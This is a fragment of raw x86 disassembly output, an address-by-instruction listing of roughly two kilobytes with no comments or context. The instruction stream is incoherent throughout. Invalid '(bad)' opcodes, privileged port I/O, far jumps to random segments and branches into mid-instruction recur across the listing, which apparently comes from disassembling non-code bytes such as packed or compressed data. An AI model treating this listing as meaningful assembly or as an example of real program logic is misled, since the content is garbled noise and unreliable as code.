  413793:	xchg   esi,eax
  413794:	sbb    al,0x1b
  413796:	mov    WORD PTR [ebx+0x64d17481],?
  41379c:	sbb    BYTE PTR [ecx],0x53
  41379f:	aaa    
  4137a0:	add    dh,BYTE PTR [edi]
  4137a2:	mov    ebx,esi
  4137a4:	jle    0x41372a
  4137a6:	ror    DWORD PTR [eax+0x1c],cl
  4137a9:	pop    ebp
  4137aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ab:	add    eax,0x474e56d
  4137b0:	arpl   WORD PTR [esi+eax*8],sp
  4137b3:	mov    ds:0x276f895a,al
  4137b8:	bound  eax,QWORD PTR [eax]
  4137ba:	sahf   
  4137bb:	push   ecx
  4137bc:	pop    edi
  4137bd:	in     eax,0x1f
  4137bf:	dec    edi
  4137c0:	mov    ebx,DWORD PTR [ebp+0x55724fd8]
  4137c6:	icebp  
  4137c7:	xchg   ecx,eax
  4137c8:	into   
  4137c9:	mov    ebx,0x65bcde38
  4137ce:	(bad)  [eax+0x36e39b58]
  4137d4:	mov    ebx,0x71dadb46
  4137d9:	lods   al,BYTE PTR ds:[esi]
  4137da:	pushf  
  4137db:	xchg   ebx,eax
  4137dc:	jecxz  0x413791
  4137de:	sbb    ch,0xf5
  4137e1:	xlat   BYTE PTR ds:[ebx]
  4137e2:	fsubr  QWORD PTR [ebx+0x46d0d74]
  4137e8:	or     al,0x7e
  4137ea:	aad    0x34
  4137ec:	and    eax,0x2803d5c
  4137f1:	xlat   BYTE PTR ds:[ebx]
  4137f2:	pusha  
  4137f3:	imul   ebx,ebp,0xa57d5dbb
  4137f9:	cmp    DWORD PTR [edx],ebx
  4137fb:	out    0xca,al
  4137fd:	push   cs
  4137fe:	pop    edx
  4137ff:	add    ebp,edi
  413801:	or     al,0xcd
  413803:	pop    es
  413804:	scas   eax,DWORD PTR es:[edi]
  413805:	or     eax,0x7a504085
  41380a:	inc    edx
  41380c:	adc    DWORD PTR [ecx-0x63b8dc78],0x74684ef4
  413816:	in     al,0xdc
  413818:	cli    
  413819:	sbb    DWORD PTR [esi-0x6c],esp
  41381c:	dec    esi
  41381d:	xchg   ecx,eax
  41381e:	xchg   edx,eax
  41381f:	xchg   edx,eax
  413820:	arpl   si,di
  413822:	icebp  
  413823:	je     0x41386f
  413825:	jg     0x4137af
  413827:	and    al,0x13
  413829:	popf   
  41382a:	dec    ebx
  41382b:	lds    eax,FWORD PTR [edx-0x4]
  41382e:	mov    cl,0xdc
  413830:	call   0x3faa:0x4271186f
  413837:	gs inc ecx
  413839:	dec    esi
  41383a:	pushf  
  41383b:	mov    ebp,0xf2dc80d3
  413840:	(bad)  
  413841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413842:	push   edi
  413843:	inc    edx
  413844:	pop    esp
  413845:	xchg   ebp,eax
  413846:	mov    eax,ds:0x3c3d7ad7
  41384b:	sub    esi,eax
  41384d:	push   edx
  41384e:	bound  esp,QWORD PTR [eax]
  413850:	xchg   esi,eax
  413851:	leave  
  413852:	sbb    DWORD PTR [eax+ebp*8-0x27],eax
  413856:	pop    esi
  413857:	fcmovu st,st(7)
  413859:	jmp    0x7a52:0x240784fc
  413860:	inc    ebx
  413861:	push   ss
  413862:	xchg   ecx,eax
  413863:	ret    0x5d56
  413866:	sbb    ah,bl
  413868:	scas   al,BYTE PTR es:[di]
  41386a:	adc    edi,DWORD PTR [edi-0x4e31edc4]
  413870:	adc    dh,bh
  413872:	add    DWORD PTR [ebp-0x2338a98d],0x1d
  413879:	scas   eax,DWORD PTR es:[edi]
  41387a:	inc    cx
  41387c:	test   BYTE PTR [esi+0x68979dae],dl
  413882:	bound  ebp,QWORD PTR [edi-0x46]
  413885:	push   eax
  413886:	mov    bh,bh
  413888:	inc    ebp
  413889:	fdivr  DWORD PTR [ecx]
  41388b:	push   ebx
  41388c:	pop    ss
  41388d:	cli    
  41388e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41388f:	retf   
  413890:	sub    bl,BYTE PTR [edi+0x6710c055]
  413896:	mov    WORD PTR [ecx+0x35bf2352],fs
  41389c:	push   ds
  41389d:	dec    ecx
  41389e:	scas   eax,DWORD PTR es:[edi]
  41389f:	xor    ah,al
  4138a1:	jmp    0x9eb7:0xfa652afb
  4138a8:	mov    eax,0x52c9f613
  4138ad:	imul   esp,DWORD PTR [ecx],0x6625346
  4138b3:	sub    edi,edi
  4138b5:	aas    
  4138b6:	or     DWORD PTR [ebx],edx
  4138b8:	and    BYTE PTR [edx],ah
  4138ba:	push   0xb13f4952
  4138bf:	stc    
  4138c0:	dec    ecx
  4138c1:	inc    ebx
  4138c2:	inc    esp
  4138c3:	dec    edx
  4138c4:	xor    al,BYTE PTR [ebp-0x4f0b91b5]
  4138ca:	ds ins BYTE PTR es:[edi],dx
  4138cc:	outs   dx,BYTE PTR ds:[esi]
  4138cd:	retf   0xdbe7
  4138d0:	popa   
  4138d1:	or     DWORD PTR [eax],esp
  4138d3:	sbb    DWORD PTR [ebx-0x62],0x40
  4138d7:	inc    esi
  4138d8:	mov    ch,0xab
  4138da:	push   edx
  4138db:	mov    dh,0x97
  4138dd:	adc    cl,BYTE PTR [ebx-0x57]
  4138e0:	pop    ebx
  4138e1:	sub    al,0xb1
  4138e3:	dec    esi
  4138e4:	add    eax,0x9b41e6a4
  4138e9:	pop    ss
  4138ea:	ins    DWORD PTR es:[edi],dx
  4138eb:	imul   ebx,DWORD PTR [ebx],0x37
  4138ee:	out    0xda,eax
  4138f0:	test   DWORD PTR [ecx-0x72adeab7],ecx
  4138f6:	fistp  WORD PTR [ecx+0x2b798d79]
  4138fc:	pop    ecx
  4138fd:	jl     0x413920
  4138ff:	push   ebx
  413900:	add    edi,DWORD PTR es:[edi]
  413903:	jg     0x41389e
  413905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413906:	ins    BYTE PTR es:[edi],dx
  413907:	pop    esp
  413908:	push   es
  413909:	int    0xc1
  41390b:	mov    bl,0x84
  41390d:	mov    al,0xba
  41390f:	fild   DWORD PTR [ecx-0x39b17536]
  413915:	stos   DWORD PTR es:[edi],eax
  413916:	(bad)  
  413917:	xor    al,0x2f
  413919:	jno    0x413954
  41391b:	and    bl,BYTE PTR [edx-0xc883522]
  413921:	add    dh,BYTE PTR [ebx]
  413923:	cmp    ah,BYTE PTR [eax-0x25]
  413926:	push   cs
  413927:	mov    ds:0xdf90919b,al
  41392c:	or     al,0x11
  41392e:	mov    eax,0xbd28114
  413933:	loop   0x413930
  413935:	mov    ebx,0xf3b417fe
  41393a:	jle    0x4138c5
  41393c:	sub    eax,0x9edb74b9
  413941:	xchg   dx,ax
  413943:	aam    0xea
  413945:	lea    edi,[esi+0x51ed9dd8]
  41394b:	xchg   edx,eax
  41394c:	and    DWORD PTR [eax+0x2],0xf32d9ff4
  413953:	mov    esi,0x3e743017
  413958:	xor    eax,0xda671bb0
  41395d:	out    0xbd,eax
  41395f:	dec    ebp
  413960:	and    DWORD PTR [ecx+ebp*2-0x603428da],0x7f8231bf
  41396b:	inc    ecx
  41396c:	call   0xcda5:0xb1d4edf4
  413973:	xchg   ebx,eax
  413974:	adc    eax,0xb10e2f65
  413979:	out    0xdb,al
  41397b:	inc    ebx
  41397c:	inc    ecx
  41397d:	aam    0x52
  41397f:	es mov ch,0x88
  413982:	cld    
  413983:	sbb    al,BYTE PTR [ebx+0x61730315]
  413989:	adc    dh,cl
  41398b:	dec    edx
  41398c:	pop    edi
  41398d:	mov    BYTE PTR [ebp+0x3f],0xce
  413991:	and    ah,BYTE PTR ds:0x8170ee61
  413997:	ficomp DWORD PTR [edx+0x17]
  41399a:	jns    0x41396b
  41399c:	mov    DWORD PTR [eax-0x5c4722ca],eax
  4139a2:	cmc    
  4139a3:	ja     0x4139df
  4139a5:	out    dx,al
  4139a6:	hlt    
  4139a7:	xchg   BYTE PTR [ecx+0x313c79ad],ch
  4139ad:	mov    dh,0xe
  4139af:	sub    ebx,DWORD PTR [ebp+0x13]
  4139b2:	mov    edx,DWORD PTR [eax-0x496edca8]
  4139b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b9:	sbb    DWORD PTR [ebx+0x57],eax
  4139bc:	mov    ah,0xf4
  4139be:	fsubr  DWORD PTR gs:[edi-0x17aa86ac]
  4139c5:	dec    eax
  4139c6:	test   DWORD PTR [ecx-0x31],edx
  4139c9:	pop    ss
  4139ca:	mov    al,0x98
  4139cc:	mov    ch,0x94
  4139ce:	(bad)  
  4139cf:	pop    eax
  4139d0:	stos   DWORD PTR es:[edi],eax
  4139d1:	push   edx
  4139d2:	popa   
  4139d3:	mov    ebx,0x4dbf4f11
  4139d8:	shl    BYTE PTR [eax],1
  4139da:	pop    edx
  4139db:	and    DWORD PTR [ebx+0x0],edx
  4139de:	push   es
  4139df:	arpl   WORD PTR [edi-0x50836fdf],ax
  4139e5:	add    al,0x21
  4139e7:	mov    ebx,0x25f01e59
  4139ec:	inc    esi
  4139ed:	sub    DWORD PTR [edi+ebp*1+0x76],esp
  4139f1:	sbb    eax,0xe2b2247a
  4139f6:	cmp    DWORD PTR [edx+0x64],0x4d9517fe
  4139fd:	mov    ds:0x60fcaaf2,eax
  413a02:	rcl    BYTE PTR [ecx-0x701631c4],1
  413a08:	inc    edx
  413a09:	mov    edi,0xebbef589
  413a0e:	inc    ebp
  413a0f:	cld    
  413a10:	jno    0x413a3d
  413a12:	jne    0x413a8c
  413a14:	dec    esi
  413a15:	pusha  
  413a16:	add    esi,DWORD PTR [eax]
  413a18:	inc    ebp
  413a19:	xchg   edi,eax
  413a1a:	clc    
  413a1b:	adc    ch,BYTE PTR ds:0xfa5d0d9c
  413a21:	and    eax,0x14f1813e
  413a26:	jp     0x4139ad
  413a28:	dec    ecx
  413a29:	and    ecx,edi
  413a2b:	pushf  
  413a2c:	mov    ds:0x9f5e333f,eax
  413a31:	xor    eax,0xc75f954b
  413a36:	cs mov ah,0x37
  413a39:	repz dec ebp
  413a3b:	sub    BYTE PTR [ecx],bh
  413a3d:	add    eax,ebx
  413a3f:	inc    ecx
  413a40:	arpl   WORD PTR [ebx+0x6efb79d7],sp
  413a46:	lahf   
  413a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a48:	pop    ds
  413a49:	jno    0x413aa4
  413a4b:	mov    esi,0x11161b23
  413a50:	pop    edx
  413a51:	mov    esp,0xae20cd62
  413a56:	mov    dl,0xda
  413a58:	and    al,0x35
  413a5a:	mov    ebp,0x142c9426
  413a5f:	shl    DWORD PTR [ebp-0x499ef7ec],cl
  413a65:	sub    eax,0x32f143d6
  413a6a:	mov    ah,0x42
  413a6c:	shr    DWORD PTR [ecx+eiz*4],1
  413a6f:	push   ss
  413a70:	aaa    
  413a71:	(bad)  
  413a72:	in     eax,dx
  413a73:	mov    BYTE PTR [edi-0x2a5379b4],ah
  413a79:	add    al,0xd6
  413a7b:	cmp    bl,ch
  413a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a7e:	dec    edx
  413a7f:	cdq    
  413a80:	jne    0x413a42
  413a82:	adc    ebp,DWORD PTR [edx-0x47ef310c]
  413a88:	push   edi
  413a89:	aad    0xaf
  413a8b:	hlt    
  413a8c:	jno    0x413a2f
  413a8e:	cmp    cl,BYTE PTR [ebp+esi*8-0x2f]
  413a92:	fadd   DWORD PTR [edi-0x60f5d332]
  413a98:	pop    edi
  413a99:	dec    esp
  413a9a:	adc    BYTE PTR [edx+0x1e],bh
  413a9d:	mov    bh,0x2
  413a9f:	xchg   edi,eax
  413aa0:	std    
  413aa1:	outs   dx,DWORD PTR ds:[esi]
  413aa2:	pop    edx
  413aa3:	add    DWORD PTR [edx+ebp*2-0x4e2de276],edi
  413aaa:	sub    al,0x57
  413aac:	fs mov ecx,0x630124de
  413ab2:	nop
  413ab3:	jns    0x413b1d
  413ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ab6:	hlt    
  413ab7:	jecxz  0x413a47
  413ab9:	mov    WORD PTR [edx-0x63],?
  413abc:	mov    edx,0xe08739dc
  413ac1:	iret   
  413ac2:	sar    eax,cl
  413ac4:	and    eax,0x303d97ab
  413ac9:	aaa    
  413aca:	fsubr  DWORD PTR ds:[ecx+0x47]
  413ace:	aaa    
  413acf:	or     DWORD PTR [esi-0x57d85165],0xc1e9c69
  413ad9:	mov    ch,0x5f
  413adb:	std    
  413adc:	repnz and DWORD PTR ds:0x890cc49d,edi
  413ae3:	jecxz  0x413a6a
  413ae5:	rcr    DWORD PTR [edi],1
  413ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ae8:	enter  0x3119,0x6c
  413aec:	fwait
  413aed:	xchg   edi,eax
  413aee:	xlat   BYTE PTR ds:[ebx]
  413aef:	sti    
  413af0:	in     al,dx
  413af1:	cmp    ebx,esi
  413af3:	sub    DWORD PTR [eax-0x738e1138],ebp
  413af9:	mov    bl,0x5d
  413afb:	scas   eax,DWORD PTR es:[edi]
  413afc:	(bad)  
  413afd:	enter  0xb7eb,0xe9
  413b01:	aas    
  413b02:	push   esi
  413b03:	jecxz  0x413ab6
  413b05:	and    BYTE PTR [eax-0x7a462979],ah
  413b0b:	push   ecx
  413b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b0d:	or     eax,0xd6271d30
  413b12:	mov    ah,0xcf
  413b14:	or     ecx,DWORD PTR [ecx-0x204ed0d9]
  413b1a:	sbb    ch,al
  413b1c:	imul   eax,DWORD PTR [edi+0x6ea10f99],0x5c8525aa
  413b26:	(bad)
  413b29:	mov    bl,BYTE PTR [ebx+0x4f5272cc]
  413b2f:	push   eax
  413b30:	sub    esp,DWORD PTR [eax-0x71]
  413b33:	push   0x12
  413b35:	and    BYTE PTR [esi],bl
  413b37:	inc    esp
  413b38:	nop
  413b39:	add    cl,ah
  413b3b:	mov    dl,BYTE PTR [eax+0x3db1c1d5]
  413b41:	in     eax,0x9f
  413b43:	inc    ebp
  413b44:	cdq    
  413b45:	and    al,0x4d
  413b47:	iret   
  413b48:	gs enter 0xd19f,0xf8
  413b4d:	pmaxsw mm4,mm7
  413b50:	popa   
  413b51:	imul   edx,DWORD PTR [ebx+0x7b],0x5b
  413b55:	les    edx,FWORD PTR [edx-0x32d88d4f]
  413b5b:	je     0x413b9d
  413b5d:	push   0x7e
  413b5f:	and    ebx,ebx
  413b61:	das    
  413b62:	pusha  
  413b63:	mov    DWORD PTR [esi-0x5677d301],ebp
  413b69:	scas   eax,DWORD PTR es:[edi]
  413b6a:	push   edi
  413b6b:	rcl    DWORD PTR [ebp-0x4e],cl
  413b6e:	jae    0x413b48
  413b70:	inc    edx
  413b71:	cdq    
  413b72:	ds and BYTE PTR fs:[ecx+0xa],0xc5
  413b78:	push   es
  413b79:	add    cl,BYTE PTR ds:0xd11b7c05
  413b7f:	xchg   DWORD PTR [ebx+ebx*8],ebx
  413b82:	fmul   QWORD PTR [ecx+0x73]
  413b85:	add    dl,BYTE PTR [esi-0x1e]
  413b88:	fcom   DWORD PTR [ebx]
  413b8a:	idiv   dl
  413b8c:	mov    ah,0x23
  413b8e:	sub    eax,DWORD PTR ss:[esi+0x37e8896]
  413b95:	sbb    eax,DWORD PTR [edi+eiz*8]
  413b98:	mov    edx,0xa4ba77bc
  413b9d:	in     eax,dx
  413b9e:	and    BYTE PTR [ebx-0x9],dl
  413ba1:	pop    ebp
  413ba2:	jl     0x413b9f
  413ba4:	call   0x6c50be01
  413ba9:	mov    fs,eax
  413bab:	lahf   
  413bac:	xchg   ecx,eax
  413bad:	sbb    al,0x2e
  413baf:	fcom   st(1)
  413bb1:	aas    
  413bb2:	dec    ecx
  413bb3:	ret    
  413bb4:	fucomip st,st(5)
  413bb6:	nop
  413bb7:	imul   edx,DWORD PTR [ebx+0x32],0xfb9360e
  413bbe:	add    eax,0xbd98914f
  413bc3:	fxtract 
  413bc5:	push   cs
  413bc6:	fucompp 
  413bc8:	aam    0x62
  413bca:	push   0x69
  413bcc:	and    edi,DWORD PTR ds:[esi+0x17]
  413bd0:	xchg   ebx,eax
  413bd1:	retf   0x63de
  413bd4:	dec    edx
  413bd5:	in     eax,dx
  413bd6:	xchg   ebp,eax
  413bd7:	dec    edi
  413bd8:	loopne 0x413c18
  413bda:	jge    0x413b7f
  413bdc:	add    ebx,DWORD PTR [edi]
  413bde:	loope  0x413bd4
  413be0:	mov    bh,bl
  413be2:	sub    al,0x82
  413be4:	hlt    
  413be5:	je     0x413b9a
  413be7:	les    ecx,FWORD PTR [ebx]
  413be9:	or     BYTE PTR [eax],bl
  413beb:	fcmove st,st(1)
  413bed:	push   ebx
  413bee:	or     eax,0xbc3c1561
  413bf3:	jns    0x413c4e
  413bf5:	js     0x413c1c
  413bf7:	jg     0x413bdb
  413bf9:	mov    bl,0xc2
  413bfb:	xchg   esi,eax
  413bfc:	pushf  
  413bfd:	pop    es
  413bfe:	adc    dh,BYTE PTR [eax]
  413c00:	stos   DWORD PTR es:[edi],eax
  413c01:	out    dx,al
  413c02:	pop    esi
  413c03:	and    al,0x5a
  413c05:	dec    eax
  413c06:	cmp    dh,dl
  413c08:	xor    dh,dl
  413c0a:	mov    bl,0x20
  413c0c:	retf   
  413c0d:	outs   dx,DWORD PTR ds:[esi]
  413c0e:	add    bl,BYTE PTR [edi+edx*8-0x7dabfac7]
  413c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c16:	(bad)
  413c1a:	xchg   edx,eax
  413c1b:	imul   edi,DWORD PTR [esi],0x3064de6e
  413c21:	daa    
  413c22:	inc    ebx
  413c23:	jne    0x413bf2
  413c25:	and    DWORD PTR [edi],ebp
  413c27:	mov    ds:0x1e8fdf32,eax
  413c2c:	sbb    ah,BYTE PTR [ebp+0x2a]
  413c2f:	hlt    
  413c30:	cmp    ebx,DWORD PTR [esi]
  413c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c33:	and    eax,0x169ea0a3
  413c38:	ret    
  413c39:	adc    eax,DWORD PTR [ecx]
  413c3b:	xchg   BYTE PTR [esi-0x171f50e0],al
  413c41:	lods   al,BYTE PTR ds:[esi]
  413c42:	and    esp,DWORD PTR [edi-0x11]
  413c45:	mov    bh,0x8d
  413c47:	outs   dx,BYTE PTR ds:[esi]
  413c48:	sub    al,0xe3
  413c4a:	xor    edi,DWORD PTR [eax-0x745dfb12]
  413c50:	mov    edi,0xf5f4073c
  413c55:	pop    edx
  413c56:	xlat   BYTE PTR ds:[ebx]
  413c57:	mov    al,0xca
  413c59:	xchg   ebp,eax
  413c5a:	xchg   WORD PTR [esp+eiz*4+0x7f],di
  413c5f:	mov    al,0x56
  413c61:	scas   eax,DWORD PTR es:[edi]
  413c62:	loopne 0x413c1b
  413c64:	repnz add ebp,DWORD PTR [eax-0x593218af]
  413c6b:	stos   DWORD PTR es:[edi],eax
  413c6c:	push   0x3e
  413c6e:	inc    esp
  413c6f:	int    0xeb
  413c71:	bnd call 0x7e98b54a
  413c77:	and    eax,0xb2ffc065
  413c7c:	out    0xe4,eax
  413c7e:	xlat   BYTE PTR ds:[ebx]
  413c7f:	mov    dl,0x11
  413c81:	add    bl,BYTE PTR [eax+0x14]
  413c84:	mov    ch,0xbd
  413c86:	imul   edx,esi,0xffffffe7
  413c89:	shl    DWORD PTR [ecx],cl
  413c8b:	sub    al,0x96
  413c8d:	sti    
  413c8e:	fdiv   QWORD PTR [ebp+0x1797e348]
  413c94:	jp     0x413c62
  413c96:	cdq    
  413c97:	rcl    BYTE PTR [esi-0x43eb802d],1
  413c9d:	scas   al,BYTE PTR es:[edi]
  413c9e:	xchg   edx,eax
  413c9f:	push   ecx
  413ca0:	stos   DWORD PTR es:[edi],eax
  413ca1:	cmp    DWORD PTR [edi-0x1d],ecx
  413ca4:	repnz cmp eax,0x35a3d1e7
  413caa:	(bad)  
  413cab:	sbb    BYTE PTR [ebx+0x58],ch
  413cae:	mov    DWORD PTR ds:0xc4e7d51b,esi
  413cb4:	fsub   QWORD PTR [eax+0x5a]
  413cb7:	mov    bh,0x53
  413cb9:	jo     0x413c64
  413cbb:	cmp    DWORD PTR [eax],esi
  413cbd:	call   0xb159:0x6095dc09
  413cc4:	add    BYTE PTR [ebp-0x1e88e601],ah
  413cca:	sbb    edi,ebx
  413ccc:	adc    bh,BYTE PTR [edi-0x385422d1]
  413cd2:	xor    ah,BYTE PTR [eax-0x42]
  413cd5:	mov    esi,ss
  413cd7:	jg     0x413d41
  413cd9:	pop    ss
  413cda:	js     0x413d22
  413cdc:	bsr    esi,edi
  413cdf:	div    DWORD PTR [eax*1+0x336e7623]
  413ce6:	clc    
  413ce7:	leave  
  413ce8:	addr16 xchg edi,eax
  413cea:	int    0x1e
  413cec:	xor    DWORD PTR [ebp+edx*4-0x19a02dbf],ecx
  413cf3:	iret   
  413cf4:	xchg   ebx,eax
  413cf5:	movd   mm6,DWORD PTR es:[ecx+0x1a]
  413cfa:	cmp    al,ch
  413cfc:	dec    esi
  413cfd:	xchg   ebx,eax
  413cfe:	repnz out dx,al
  413d00:	std    
  413d01:	sbb    al,0x32
  413d03:	scas   al,BYTE PTR es:[edi]
  413d04:	loop   0x413d7a
  413d06:	sbb    ecx,ebx
  413d08:	dec    ebx
  413d09:	xor    BYTE PTR [ecx-0x41],0x17
  413d0d:	popa   
  413d0e:	mov    WORD PTR [ecx-0x79dc3068],gs
  413d14:	pushf  
  413d15:	fild   WORD PTR [edi]
  413d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d18:	and    cl,BYTE PTR [edx+0x12]
  413d1b:	mov    ecx,0x68f6dd9e
  413d20:	cs push edx
  413d22:	ins    BYTE PTR es:[edi],dx
  413d23:	or     BYTE PTR ds:0xf5716062,al
  413d29:	stos   BYTE PTR es:[edi],al
  413d2a:	sbb    dh,dh
  413d2c:	add    BYTE PTR [ecx-0x42],bl
  413d2f:	xor    eax,0x26f54aae
  413d34:	lock loope 0x413cea
  413d37:	jne    0x413d65
  413d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d3b:	cmp    al,0xe4
  413d3d:	pop    ebp
  413d3e:	in     al,dx
  413d3f:	inc    esp
  413d40:	mov    ah,0x7b
  413d42:	inc    eax
  413d43:	pop    esi
  413d44:	mov    ebp,0xc5dcfbd0
  413d49:	out    dx,al
  413d4a:	out    0xb2,eax
  413d4c:	cmp    eax,edi
  413d4e:	mov    BYTE PTR [esi],cl
  413d50:	or     ecx,DWORD PTR [edi+0x36064b33]
  413d56:	gs loopne 0x413dc0
  413d59:	mov    edi,DWORD PTR [eax]
  413d5b:	iret   
  413d5c:	pop    edx
  413d5d:	or     bl,BYTE PTR [ebp+0x16]
  413d60:	push   cs
  413d61:	lods   eax,DWORD PTR ds:[esi]
  413d62:	sub    eax,0xc8d71110
  413d67:	jbe    0x413d54
  413d69:	push   eax
  413d6a:	add    eax,0x589e7cb1
  413d6f:	push   0xffffffd3
  413d71:	scas   al,BYTE PTR es:[edi]
  413d72:	aaa    
  413d73:	mov    dx,WORD PTR [edi+ebp*4+0x70]
  413d78:	imul   esp,DWORD PTR cs:[edx],0x9e0d1c31
  413d7f:	loop   0x413d07
  413d81:	dec    esi
  413d82:	or     bh,al
  413d84:	jnp    0x413d9d
  413d86:	pusha  
  413d87:	sub    al,0xc6
  413d89:	mov    ds,esp
  413d8b:	ss loope 0x413e0a
  413d8e:	add    eax,0xb9a5616a
  413d93:	xchg   ecx,eax
  413d94:	repnz sti 
  413d96:	arpl   sp,di
  413d98:	mov    al,ds:0x647b230f
  413d9d:	idiv   DWORD PTR [edi]
  413d9f:	fcmovbe st,st(7)
  413da1:	sbb    eax,0x3ef053b3
  413da6:	cmc    
  413da7:	push   edx
  413da8:	repnz add al,0xda
  413dab:	jae    0x413dae
  413dad:	cwde   
  413dae:	int3   
  413daf:	sub    ebx,DWORD PTR [eax+0x20]
  413db2:	ins    BYTE PTR es:[edi],dx
  413db3:	neg    BYTE PTR [esi]
  413db5:	stc    
  413db6:	cmp    DWORD PTR [esi],ebp
  413db8:	mov    BYTE PTR [edi-0x29bed9d7],0x48
  413dbf:	push   eax
  413dc0:	xor    ebp,ecx
  413dc2:	xchg   ebx,eax
  413dc3:	int3   
  413dc4:	mov    bh,0x9a
  413dc6:	sbb    cl,BYTE PTR [ecx]
  413dc8:	sbb    DWORD PTR [edi+0x534f4f9d],edx
  413dce:	in     al,dx
  413dcf:	push   ss
  413dd0:	mov    bh,0xd9
  413dd2:	in     eax,0x18
  413dd4:	pop    edi
  413dd5:	and    DWORD PTR [ecx],ecx
  413dd7:	clc    
  413dd8:	sub    DWORD PTR [esp+eax*1],ecx
  413ddb:	cmp    DWORD PTR [eax+0x3],ebp
  413dde:	xchg   esp,eax
  413ddf:	jnp    0x413d7f
  413de1:	ficomp WORD PTR [ebx-0x370c3ef6]
  413de7:	inc    ebx
  413de8:	mov    edi,0xebca43f
  413ded:	cmp    al,0x2a
  413def:	leave  
  413df0:	(bad)  
  413df1:	push   es
  413df2:	cmp    al,0x67
  413df4:	mov    eax,ds:0xe606d98f
  413df9:	jge    0x413e3c
  413dfb:	fcmove st,st(1)
  413dfd:	or     eax,0xe9317005
  413e02:	push   ds
  413e03:	ins    BYTE PTR es:[edi],dx
  413e04:	ret    
  413e05:	push   ds
  413e06:	outs   dx,DWORD PTR ds:[esi]
  413e07:	aas    
  413e08:	and    dh,BYTE PTR [ebx-0x1135fedc]
  413e0e:	mov    ds:0x2a18b229,eax
  413e13:	enter  0x59e9,0xdb
  413e17:	fiadd  WORD PTR [ecx-0x501a21d0]
  413e1d:	pop    ebp
  413e1e:	(bad)  
  413e1f:	jmp    0x413dc6
  413e21:	stc    
  413e22:	and    BYTE PTR [eax+ebx*2-0x1e],bl
  413e26:	pop    esp
  413e27:	stos   BYTE PTR es:[edi],al
  413e28:	mov    BYTE PTR [ecx-0x7c],bl
  413e2b:	xchg   esp,eax
  413e2c:	sbb    edi,ebp
  413e2e:	pop    ds
  413e2f:	popa   
  413e30:	mov    eax,0x20dba1ac
  413e35:	mov    eax,ds:0x495fc143
  413e3a:	push   0xffffffe3
  413e3c:	cmp    BYTE PTR [eax],dh
  413e3e:	lahf   
  413e3f:	mov    ds:0x9affac7d,al
  413e44:	cs inc esi
  413e46:	arpl   cx,bp
  413e48:	cmp    bl,bh
  413e4a:	retf   0xe84b
  413e4d:	(bad)  
  413e4e:	fwait
  413e4f:	jnp    0x413e8e
  413e51:	scas   eax,DWORD PTR es:[edi]
  413e52:	bound  ecx,QWORD PTR [edx+ebx*2-0x32]
  413e56:	imul   esp,DWORD PTR [ebp-0x20],0xabdb7969
  413e5d:	(bad)  
  413e5e:	cmp    ebx,DWORD PTR [esi+0x69c075a5]
  413e64:	je     0x413e89
  413e66:	pop    ds
  413e67:	mov    al,ds:0x88d8e508
  413e6c:	dec    ebx
  413e6d:	add    BYTE PTR [esi+ebp*2-0x7afe4493],dh
  413e74:	adc    DWORD PTR [edi-0x58],0x62
  413e78:	cmp    al,0x17
  413e7a:	jmp    0x4cd4:0xdb6769e2
  413e81:	pop    ss
  413e82:	jb     0x413e0b
  413e84:	pop    esi
  413e85:	push   eax
  413e86:	xchg   esi,eax
  413e87:	mov    ebx,0x627216cb
  413e8c:	(bad)  
  413e8d:	fdivr  DWORD PTR [ebx+0x584af623]
  413e93:	jb     0x413eca
  413e95:	jnp    0x413ece
  413e97:	fsub   QWORD PTR [ebp-0x74db4664]
  413e9d:	jae    0x413f15
  413e9f:	dec    eax
  413ea0:	fcomp  QWORD PTR [ebx+0x3d094c77]
  413ea6:	aaa    
  413ea7:	rol    edx,0xbb
  413eaa:	fcmovnb st,st(1)
  413eac:	cmc    
  413ead:	das    
  413eae:	mov    ?,WORD PTR [eax+0x2d125a59]
  413eb4:	inc    edi
  413eb5:	xor    BYTE PTR ds:0x4648b099,cl
  413ebb:	add    eax,0x5063eb48
  413ec0:	out    dx,al
  413ec1:	push   es
  413ec2:	ret    0x2929
  413ec5:	add    ebp,edi
  413ec7:	mov    al,ds:0x327e0114
  413ecc:	in     al,0xdf
  413ece:	sbb    eax,ebp
  413ed0:	into   
  413ed1:	shl    BYTE PTR [ebx],1
  413ed3:	inc    ebp
  413ed4:	rcl    BYTE PTR [ebp-0x137b913a],0xc7
  413edb:	mov    ah,0xbb
  413edd:	ret    
  413ede:	retf   0x3d3b
  413ee1:	lea    ebx,[eax*4-0x6b308401]
  413ee8:	fisub  DWORD PTR [edi-0x3]
  413eeb:	jb     0x413eec
  413eed:	mov    ecx,0xc0c23fd6
  413ef2:	mov    ebp,0xfe152ede
  413ef7:	dec    ebx
  413ef8:	loope  0x413f12
  413efa:	xchg   DWORD PTR [edx-0x50],ebp
  413efd:	and    eax,DWORD PTR [esi+0x5a]
  413f00:	add    eax,0x5f32aa16
  413f05:	xchg   edx,eax
  413f06:	pusha  
  413f07:	mov    bh,0xd4
  413f09:	call   0x300:0x97012300
  413f10:	dec    esi
  413f11:	fnstsw WORD PTR [edi-0x79de9d5c]
  413f17:	xlat   BYTE PTR ds:[ebx]
  413f18:	sbb    al,0xbe
  413f1a:	lock mov bp,0x8170
  413f1f:	out    0x86,eax
  413f21:	aas    
  413f22:	jne    0x413f3d
  413f24:	mov    ah,0x98
  413f26:	shl    BYTE PTR [ebx+0x41cf902d],cl
  413f2c:	ja     0x413f42
  413f2e:	das    
  413f2f:	pusha  
  413f30:	or     BYTE PTR [edx+0x7f],dl
  413f33:	mov    dh,0xde
  413f35:	dec    esp
  413f36:	jle    0x413ec5
